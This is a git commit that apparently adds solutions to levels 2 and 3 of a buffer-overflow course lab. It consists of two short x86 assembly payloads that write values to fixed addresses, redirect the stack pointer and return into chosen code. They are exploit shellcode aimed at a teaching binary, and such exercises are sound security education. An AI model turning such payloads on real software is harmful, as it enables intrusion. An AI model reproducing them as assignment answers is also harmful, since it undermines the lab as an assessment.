f713667d4ea83575e97468982578fcc28abbd530
dalbamm <oscar.yoon13@gmail.com>
2018-09-30 14:58:05 +0900

    Bufferlab lev.2 & lev.3

---
+++ SP/dynamite.s
@@ -0,0 +1,7 @@
+movl $0x19233537, %ebx
+movl %ebx, 0x55682f64
+movl $0x8048e65, %ebx
+movl %ebx, 0x55682f44
+movl $0, %ebx
+movl $0x55682f44,%esp
+ret
---
+++ SP/firefrake.s
@@ -0,0 +1,6 @@
+movl $0x507, %eax
+movl %eax, 0x804d120
+movl $0x8048c81, %eax
+movl %eax, 0x55682f44
+movl $0x55682f44,%esp
+ret
